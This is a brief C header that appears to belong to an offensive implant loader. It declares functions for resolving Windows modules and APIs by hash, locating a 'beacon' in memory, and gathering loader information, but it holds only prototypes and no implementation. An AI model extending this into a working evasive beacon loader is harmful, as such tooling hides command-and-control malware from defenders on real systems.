#include <Windows.h>

#include "instance.h"

#define PATTERN_SIZE 14

void* xGetProcAddr(void* pModuleAddr, DWORD dwFunctionHash);
void* xGetModuleAddr(DWORD dwModuleHash);
ULONG_PTR FindBeacon();
BOOL _memcpy(void* dest, void* src, size_t size);
DWORD _strlenA(PBYTE lpName);
VOID GetLoaderInfo(PLOADER_INFO ldrInfo, ULONG_PTR uBeaconAddr);